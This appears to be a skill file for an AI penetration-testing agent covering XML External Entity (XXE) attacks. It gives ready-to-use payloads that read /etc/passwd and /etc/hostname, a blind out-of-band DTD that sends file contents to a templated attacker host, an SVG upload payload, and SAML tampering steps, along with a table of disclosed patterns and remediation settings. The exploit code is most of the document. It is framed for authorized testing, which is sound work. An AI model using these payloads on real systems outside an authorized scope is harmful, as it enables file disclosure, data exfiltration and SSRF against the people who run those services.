---
name: web-xxe-oob-extraction
description: XML External Entity (XXE) assessment, local file disclosure, SSRF via XML parsers, blind parameter entity out-of-band exfiltration, and SVG/DOCX/SAML payload delivery.
---

# XML External Entity (XXE) & Blind Parameter Exfiltration

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified XML-accepting APIs, SAML 2.0 endpoints, SVG image uploaders, and spreadsheet/document importers in `scope.yaml`.
- **Target Parameters:** Endpoints accepting `Content-Type: application/xml`, `text/xml`, `application/saml+xml`, or multi-part uploads processing XML-based formats (SVG, DOCX, XLSX).
- **Traffic Routing:** Route test payloads through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Basic In-Band XXE & Local File Retrieval
Inject standard DOCTYPE entity definition into the XML body:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userRequest>
  <username>&xxe;</username>
  <email>test@example.com</email>
</userRequest>
```

### Step 2: Content-Type Switching & JSON-to-XML Conversion
If an endpoint normally accepts JSON, test whether the parser auto-converts or accepts XML:
```http
POST /api/v1/user/update HTTP/1.1
Host: target.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY test SYSTEM "file:///etc/hostname">]>
<root><name>&test;</name></root>
```

### Step 3: Blind Parameter Entity Out-of-Band (OOB) Exfiltration
When entity reflection in the response body is suppressed:
1. **Host an external DTD (`eval.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{{ oob_domain }}/?data=%file;'>">
%eval;
%exfil;
```
2. **Deliver the attack payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://{{ oob_domain }}/eval.dtd">
  %dtd;
]>
<data>test</data>
```

### Step 4: XML-Based File Formats (SVG / DOCX / XLSX / SAML)
1. **SVG Image Upload:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ELEMENT svg ANY >
  <!ENTITY % sp SYSTEM "http://{{ oob_domain }}/svg-probe">
  %sp;
]>
<svg width="100px" height="100px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&sp;</text>
</svg>
```
2. **SAML 2.0 Response Tampering:** Inject DOCTYPE into Base64-encoded `SAMLResponse` body before XML signature validation.

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Processing Context | Vulnerability Root Cause | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **Office DOCX/XLSX Parser** | Unsafe `DocumentBuilderFactory` parsing `[Content_Types].xml` | Injected parameter entity in zipped `word/document.xml` | Out-of-band HTTP request containing `/etc/passwd` |
| **SAML IdP Authentication** | XML parser resolves external schema DTDs | DOCTYPE inside `<samlp:Response>` points to internal IP | Internal port scanning / SSRF |
| **Profile Avatar SVG Upload** | Server uses `librsvg` or ImageMagick without disabling entity resolution | Uploaded `.svg` avatar extracts server hostname | Server hostname rendered on user profile image |
| **API Gateway Content-Type Juggling** | Gateway converts JSON $\rightarrow$ XML for backend SOAP | Send `Content-Type: application/xml` with entity | SOAP service reflects internal configuration files |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture HTTP request containing DOCTYPE entity definition and response body (or collaborator log) showing retrieved system information (e.g. `/etc/hostname` or `/etc/issue`).
2. **Impact Proof:** Verify retrieval of non-sensitive system files without accessing private user credentials or causing parser denial of service (e.g. Billion Laughs).
3. **Remediation:** Disable XML external entity resolution (`FEATURE_SECURE_PROCESSING`, `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`), and disable external DTD fetching in all XML parser factories.
